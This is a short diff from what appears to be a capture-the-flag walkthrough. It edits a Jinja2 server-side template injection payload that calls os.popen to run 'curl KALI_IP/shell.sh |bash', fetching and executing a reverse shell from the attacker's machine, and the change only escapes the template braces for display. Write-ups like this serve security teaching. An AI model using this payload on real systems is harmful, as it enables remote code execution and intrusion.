@@ -128,7 +128,7 @@ python3 -m http.server 80
 Then I will edit the payload to curl bash our reverse shell
 
 ```
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl KALI_IP/shell.sh |bash').read() }}
+{.\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl KALI_IP/shell.sh |bash').read() }}
 ```
 
 Then once we go to `/archive` we will get our shell!
